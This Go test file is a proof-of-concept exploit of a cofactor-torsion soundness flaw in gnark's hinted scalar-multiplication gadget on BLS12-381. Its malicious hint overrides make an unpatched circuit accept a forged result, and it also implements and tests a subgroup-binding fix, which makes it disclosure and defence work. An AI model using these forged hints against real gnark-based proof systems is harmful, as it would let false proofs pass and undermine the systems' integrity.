// Package attack demonstrates the cofactor-torsion soundness attack on the
// hinted-output scalar-multiplication gadget of gnark (Curve.ScalarMul, the
// GLV+fake-GLV method of Eagen--El Housni--Masson--Piellard), and the
// hinted-preimage fix. It is written against *unpatched* gnark (master) and
// targets BLS12-381 G1, whose cofactor is divisible by 3, using the
// chosen-scalar forgery with the small prime l = 3.
//
//	go test -v
package attack

import (
	"fmt"
	"math/big"
	"testing"

	"github.com/consensys/gnark-crypto/ecc"
	bls12381 "github.com/consensys/gnark-crypto/ecc/bls12-381"
	fr "github.com/consensys/gnark-crypto/ecc/bls12-381/fr"
	"github.com/consensys/gnark/constraint/solver"
	"github.com/consensys/gnark/frontend"
	"github.com/consensys/gnark/frontend/cs/r1cs"
	"github.com/consensys/gnark/std/algebra/emulated/sw_emulated"
	"github.com/consensys/gnark/std/math/emulated"
	"github.com/consensys/gnark/std/math/emulated/emparams"
)

// ---------------------------------------------------------------------------
// Curve data: BLS12-381 G1 (y^2 = x^3 + 4), cofactor h = 3 * 11^2 * 10177^2 ...
// ---------------------------------------------------------------------------

// ell is the small cofactor prime we exploit (3 | cofactor of BLS12-381 G1).
const ell = 3

// GLV eigenvalue lambda: psi(P) = [lambda]P on the order-r subgroup.
var lambda, _ = new(big.Int).SetString("228988810152649578064853576960394133503", 10)

var (
	basePoint bls12381.G1Affine // P, a subgroup (order-r) generator
	torsionT  bls12381.G1Affine // T, a rational order-3 point OUTSIDE the subgroup
	badScalar big.Int           // s, the chosen scalar
	honestOut bls12381.G1Affine // [s]P  (the true result)
	forgedOut bls12381.G1Affine // [s]P + T  (the forged result, != [s]P)
)

func init() {
	solver.RegisterHint(preimageHint)

	_, _, basePoint, _ = bls12381.Generators() // P in the order-r subgroup

	// T = (0, 2): on the curve (2^2 = 0 + 4) and of order 3 (the psi-fixed
	// 3-torsion (0, sqrt(b)) of a j=0 curve). It lies outside the subgroup
	// because 3 divides the cofactor, not r.
	torsionT.X.SetUint64(0)
	torsionT.Y.SetUint64(2)
	if !torsionT.IsOnCurve() {
		panic("T not on curve")
	}
	var t3 bls12381.G1Affine
	t3.ScalarMultiplication(&torsionT, big.NewInt(ell))
	if !t3.IsInfinity() {
		panic("T is not of order 3")
	}

	// Chosen scalar: with the forged decomposition (u1,u2,v1,v2) = (1,0,0,ell)
	// the certifying identity [u1]P+[u2]psi(P)+[v1]Q+[v2]psi(Q) = 0 becomes
	// [1 + ell*lambda*s]P (the torsion [ell]psi(T) vanishes), so we need
	// s = -(ell*lambda)^{-1} mod r.
	r := fr.Modulus()
	el := new(big.Int).Mul(big.NewInt(ell), lambda)
	el.Mod(el, r)
	inv := new(big.Int).ModInverse(el, r)
	badScalar.Neg(inv).Mod(&badScalar, r)

	honestOut.ScalarMultiplication(&basePoint, &badScalar) // [s]P
	forgedOut.Add(&honestOut, &torsionT)                   // [s]P + T
}

// ---------------------------------------------------------------------------
// The circuit: it simply calls the public gnark ScalarMul gadget and asserts
// the result equals a witnessed point Q. With withFix set, it additionally
// binds the output into the subgroup (the fix).
// ---------------------------------------------------------------------------

type scalarMulCircuit struct {
	P       sw_emulated.AffinePoint[emparams.BLS12381Fp]
	S       emulated.Element[emparams.BLS12381Fr]
	Q       sw_emulated.AffinePoint[emparams.BLS12381Fp]
	withFix bool
}

func (c *scalarMulCircuit) Define(api frontend.API) error {
	cr, err := sw_emulated.New[emparams.BLS12381Fp, emparams.BLS12381Fr](api, sw_emulated.GetBLS12381Params())
	if err != nil {
		return err
	}
	res := cr.ScalarMul(&c.P, &c.S) // <-- the hinted-output gadget under attack
	if c.withFix {
		assertInSubgroup(api, cr, res) // <-- the fix
	}
	cr.AssertIsEqual(res, &c.Q)
	return nil
}

// assertInSubgroup binds R into the prime-order subgroup by hinting a preimage
// S = [ell^{-1} mod r] R, asserting S on-curve, and enforcing [ell]S == R with a
// *sound* (double-and-add) constant multiplication. A torsion-tainted
// R = [s]P + T has ord(T) = ell | ell, so [ell]([ell^{-1}]R) = [s]P != R and the
// equality fails. ell = 3 clears the exploited 3-torsion.
func assertInSubgroup(api frontend.API, cr *sw_emulated.Curve[emparams.BLS12381Fp, emparams.BLS12381Fr], R *sw_emulated.AffinePoint[emparams.BLS12381Fp]) {
	// Hint the preimage S = [ell^{-1}]R (twice, as S1 and S2) using the curve's
	// own field context. The gnark-internal fix uses mulByConstant (which has a
	// Double); here Double is unexported, and AddUnified(S,S) on the *same*
	// element folds S.X-S.X to a constant, so we double via two equal-but-
	// distinct copies S1 == S2, which is sound and compiles.
	_, pre, _, err := emulated.NewVarGenericHint[emparams.BLS12381Fp, emparams.BLS12381Fr](
		api, 0, 4, 0, nil,
		[]*emulated.Element[emparams.BLS12381Fp]{&R.X, &R.Y}, nil, preimageHint)
	if err != nil {
		panic(err)
	}
	S1 := &sw_emulated.AffinePoint[emparams.BLS12381Fp]{X: *pre[0], Y: *pre[1]}
	S2 := &sw_emulated.AffinePoint[emparams.BLS12381Fp]{X: *pre[2], Y: *pre[3]}
	cr.AssertIsEqual(S1, S2) // bind the two copies together (soundness)
	cr.AssertIsOnCurve(S1)   // S must be a genuine curve point
	// [3]S = ((S1 + S2) + S1) with the complete (unified) addition -- sound.
	twoS := cr.AddUnified(S1, S2)
	threeS := cr.AddUnified(twoS, S1)
	cr.AssertIsEqual(threeS, R)
}

// ---------------------------------------------------------------------------
// Malicious hint overrides (the exploit). They replace the two hints that
// Curve.ScalarMul relies on: the decomposition (rationalReconstructExt) and the
// hinted output ([s]P via scalarMulHint).
// ---------------------------------------------------------------------------

// forgeDecomp returns the fixed decomposition (u1,u2,v1,v2) = (1,0,0,ell)
// instead of the honest short lattice vector. All within the sub-scalar range.
func forgeDecomp(field *big.Int, inputs, outputs []*big.Int) error {
	return emulated.UnwrapHintContext(field, inputs, outputs, func(hc emulated.HintContext) error {
		mod := hc.EmulatedModuli()[0]
		_, nativeOutputs := hc.NativeInputsOutputs()
		_, emuOutputs := hc.InputsOutputs(mod)
		emuOutputs[0].SetInt64(1)   // |u1|
		emuOutputs[1].SetInt64(0)   // |u2|
		emuOutputs[2].SetInt64(0)   // |v1|
		emuOutputs[3].SetInt64(ell) // |v2|
		for i := 0; i < 4; i++ {
			nativeOutputs[i].SetUint64(0) // all signs positive
		}
		return nil
	})
}

// forgeScalarMul returns [s]P + T instead of [s]P: the torsion-shifted output.
func forgeScalarMul(field *big.Int, inputs, outputs []*big.Int) error {
	return emulated.UnwrapHintContext(field, inputs, outputs, func(hc emulated.HintContext) error {
		moduli := hc.EmulatedModuli()
		baseMod, scalarMod := moduli[0], moduli[1]
		baseInputs, baseOutputs := hc.InputsOutputs(baseMod)
		scalarInputs, _ := hc.InputsOutputs(scalarMod)
		var P bls12381.G1Affine
		P.X.SetBigInt(baseInputs[0])
		P.Y.SetBigInt(baseInputs[1])
		var Q bls12381.G1Affine
		Q.ScalarMultiplication(&P, scalarInputs[0]) // [s]P
		Q.Add(&Q, &torsionT)                        // [s]P + T
		Q.X.BigInt(baseOutputs[0])
		Q.Y.BigInt(baseOutputs[1])
		return nil
	})
}

// preimageHint computes S = [ell^{-1} mod r] R for the fix.
func preimageHint(field *big.Int, inputs, outputs []*big.Int) error {
	return emulated.UnwrapHintContext(field, inputs, outputs, func(hc emulated.HintContext) error {
		baseMod := hc.EmulatedModuli()[0]
		baseInputs, baseOutputs := hc.InputsOutputs(baseMod)
		var R bls12381.G1Affine
		R.X.SetBigInt(baseInputs[0])
		R.Y.SetBigInt(baseInputs[1])
		einv := new(big.Int).ModInverse(big.NewInt(ell), fr.Modulus())
		var S bls12381.G1Affine
		S.ScalarMultiplication(&R, einv)
		S.X.BigInt(baseOutputs[0]) // S1
		S.Y.BigInt(baseOutputs[1])
		S.X.BigInt(baseOutputs[2]) // S2 (a second, distinct copy)
		S.Y.BigInt(baseOutputs[3])
		return nil
	})
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

func point(p bls12381.G1Affine) sw_emulated.AffinePoint[emparams.BLS12381Fp] {
	return sw_emulated.AffinePoint[emparams.BLS12381Fp]{
		X: emulated.ValueOf[emparams.BLS12381Fp](p.X),
		Y: emulated.ValueOf[emparams.BLS12381Fp](p.Y),
	}
}

func witness(out bls12381.G1Affine, fix bool) *scalarMulCircuit {
	return &scalarMulCircuit{
		P:       point(basePoint),
		S:       emulated.ValueOf[emparams.BLS12381Fr](badScalar),
		Q:       point(out),
		withFix: fix,
	}
}

// forgeOpts installs the two malicious hint overrides (real solver).
func forgeOpts() []solver.Option {
	hs := sw_emulated.GetHints() // [decomposeScalarG1, scalarMulHint, rationalReconstruct, rationalReconstructExt]
	return []solver.Option{
		solver.OverrideHint(solver.GetHintID(hs[1]), forgeScalarMul),
		solver.OverrideHint(solver.GetHintID(hs[3]), forgeDecomp),
	}
}

// solved compiles the circuit to an R1CS and reports whether the witness solves
// it (nil = accepted), running the given solver options (hint overrides).
func solved(fix bool, out bls12381.G1Affine, opts ...solver.Option) error {
	ccs, err := frontend.Compile(ecc.BN254.ScalarField(), r1cs.NewBuilder, &scalarMulCircuit{withFix: fix})
	if err != nil {
		return err
	}
	w, err := frontend.NewWitness(witness(out, fix), ecc.BN254.ScalarField())
	if err != nil {
		return err
	}
	return ccs.IsSolved(w, opts...)
}

// ---------------------------------------------------------------------------
// Tests: honest baseline, the forgery, and the fix.
// ---------------------------------------------------------------------------

// TestHonestBaseline: the honest ScalarMul(P,s) = [s]P is accepted.
func TestHonestBaseline(t *testing.T) {
	if err := solved(false, honestOut); err != nil {
		t.Fatalf("honest scalar mul should be accepted: %v", err)
	}
}

// TestForgeryAccepted (THE ATTACK): on unpatched gnark, ScalarMul(P,s) is made
// to accept the torsion-shifted output [s]P + T != [s]P.
func TestForgeryAccepted(t *testing.T) {
	if err := solved(false, forgedOut, forgeOpts()...); err != nil {
		t.Fatalf("expected the forgery to be ACCEPTED on unpatched gnark, but it was rejected: %v", err)
	}
	fmt.Println("ATTACK: ScalarMul accepted [s]P + T as [s]P  (soundness broken)")
}

// TestFixBlocksForgery (THE FIX): with the subgroup binding, the same forgery is
// rejected.
func TestFixBlocksForgery(t *testing.T) {
	if err := solved(true, forgedOut, forgeOpts()...); err == nil {
		t.Fatal("expected the fix to REJECT the forgery, but it was accepted")
	}
	fmt.Println("FIX: subgroup binding rejected the forged [s]P + T")
}

// TestFixKeepsHonest: the fix does not break the honest computation.
func TestFixKeepsHonest(t *testing.T) {
	if err := solved(true, honestOut); err != nil {
		t.Fatalf("fix must keep the honest scalar mul valid: %v", err)
	}
}
